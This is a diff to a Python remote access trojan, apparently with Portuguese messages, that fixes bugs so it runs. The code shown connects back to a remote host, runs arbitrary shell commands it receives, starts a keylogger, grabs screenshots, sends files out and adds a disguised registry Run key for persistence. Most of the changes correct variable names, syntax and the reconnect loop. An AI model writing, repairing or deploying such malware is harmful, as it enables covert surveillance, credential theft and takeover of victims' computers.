@@ -49,7 +49,7 @@ def autorun():
     try:
         FNULL = open(os.devnull, 'w')
         subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
-                         " /v SystemProcesses /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
+                         " /v Sysnet /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
     except:
         pass
         
@@ -67,31 +67,31 @@ def main():
             STDOUT, STDERR = None, None
             cmd = sock.recv(1024)
             if cmd == '/sair':
-                s.close()
+                sock.close()
                 exit()
             elif cmd == '/keylogger':
                 sock.send('[+] iniciando keylogger...')
                 time.sleep(2)
-                keylog = Process(target="start_key", args=())
+                keylog = Process(target="start_key", args=(' '))
                 keylog.start()
                 continue
-            elif data == '/autorun':
+            elif cmd == '/autorun':
                 sock.send('[+] iniciando persistencia')
-                auto = Process(target="autorun", args=()) 
+                auto = Process(target="autorun", args=(' ')) 
                 auto.start()
                 continue
-            elif data == '/print':
+            elif cmd == '/print':
                 imagem = ImageGrab.grab()
-                foto = imagem.save('screenShot1.jpg', 'jpeg')
-                sock.send('[+] Print salva em {}').format(os.getcwd()).encode())
+                imagem.save('foto.jpg', 'jpeg')
+                sock.send('[+] Print salva em {}').format(os.getcwd()).encode()
                 continue    
-            elif data == '/help':
+            elif cmd == '/help':
                 texto = '''
                 [+] comandos : 
                     /help - printa esse texto
                     /keylogger - inicia processo de captura de tecla
                     /autorun - inicia persistencia
-                    /print - tira prints da tela
+                    /print - tira print da tela
                     /sysinfo - mostra informações do sistema
                     /sair - fecha conexão com alvo        
                     /download - baixa arquivos locais
@@ -113,10 +113,10 @@ def main():
                     while file_data:
                         sock.send(file_data)
                         file_data = f.read(1024)
-                    sleep(2)
+                    time.sleep(2)
                     sock.send(b"DONE")
                
-             else:
+            else:
                 comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 STDOUT, STDERR = comm.communicate()
                 if not STDOUT:
@@ -126,17 +126,14 @@ def main():
     except:
         exit()
 
-
-
 def repetir():
     socktest = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
-        s_conectado = sock.connect((RHOST, RPORT))
+        s_conectado = socktest.connect((RHOST, RPORT))
         if s_conectado:
             main()
         else:
             time.sleep(5)   
-            
             
             
 if __name__ == '__main__':
